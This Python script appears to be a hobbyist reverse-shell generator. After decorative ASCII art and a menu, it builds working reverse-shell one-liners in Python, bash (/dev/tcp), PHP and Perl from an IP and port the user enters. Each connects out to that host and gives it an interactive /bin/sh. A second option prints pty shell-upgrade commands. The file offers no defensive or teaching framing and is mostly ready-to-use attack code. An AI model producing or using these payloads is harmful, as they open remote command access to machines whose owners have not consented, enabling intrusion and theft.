import random
import time
logo=["""
 _______________
< REVERSE SHELL >
 ---------------
       \   ,__,
        \  (oo)____
           (__)    )\ 
              ||--|| *
              
              """,
"""

   (                                 _
   )                               /=>
  (  +____________________/\/\___ / /|
   .''._____________'._____      / /|/\ 
  : () :              :\ ----\|    \ )
   '..'______________.'0|----|      \ 
                    0_0/____/        \ 
       \                |----    /----\ 
        \              || -\\ --|      \ 
         \             ||   || ||\      \ 
_________/\__           \\____// '|      \ 
|Bang! Bang!|                   .'/       |
-------------                  .:/        |
                               :/_________|
 
                                           """,
''' 
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    |   Nice tool  |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'  
     ''', """ 
                           .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  ##                 ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||                     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         i\so.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!
          `..::!8888888888888888888888888888888899fT|!^"'
            `' !!988888888888888888888888899fT|!^"'
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
                      """]
print(random.choice(logo))
print("load ...")
time.sleep(3)
print ("""
██████╗░███████╗██╗░░░██╗███████╗██████╗░░██████╗███████╗  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔════╝██║░░░██║██╔════╝██╔══██╗██╔════╝██╔════╝  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██████╔╝█████╗░░╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░█████╗░░  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██╔══██╗██╔══╝░░░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██╔══╝░░  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░░██║███████╗░░╚██╔╝░░███████╗██║░░██║██████╔╝███████╗  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

░██████╗░███████╗███╗░░██╗░░░░░░░░░
██╔════╝░██╔════╝████╗░██║░░░░░░░░░
██║░░██╗░█████╗░░██╔██╗██║░░░░░░░░░
██║░░╚██╗██╔══╝░░██║╚████║░░░░░░░░░
╚██████╔╝███████╗██║░╚███║██╗██╗██╗
░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝╚═╝╚═╝""")
print ("""
1- Script
2- Shell UP""")
sq = input ("Select: ")
if sq=="1":
    print ("""
    1- python
    2- bash
    3- php
    4- perl""")
    dec = input ("Select: ")
    if dec == "1":
        ip = input("IP: ")
        port = input ("Port: ")
        pyv = input ("Python 2/3 : ")
        ap = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''
        bp = """","""
        cp = """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        print(ap+ip+bp+port+cp)
    elif dec=="2":
        ip = input("IP: ")
        port = input ("Port: ")
        ba="bash -i >& /dev/tcp/"
        bh="/"
        bb=" 0>&1"
        print(ba+ip+bh+port+bb)
    elif dec=="3":
        ip = input("IP: ")
        port = input ("Port: ")
        pa='''php -r '$sock=fsockopen("'''
        pb=","
        pc=""");exec("/bin/sh -i <&3 >&3 2>&3");'"""
        print(pa+ip+pb+port+pc)
    elif dec=="4":
        ip = input("IP: ")
        port = input ("Port: ")
        a='''perl -e 'use Socket;$i="'''
        b='";$p='
        c=""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
        print(a+ip+b+port+c)
elif sq=="2":
  print("""
  PERL
  perl -e 'exec "/bin/bash";'
  
  BASH
  echo os.system('/bin/bash')
  
  PYTHON
  python -c 'import pty; pty.spawn("/bin/bash")'
  """)
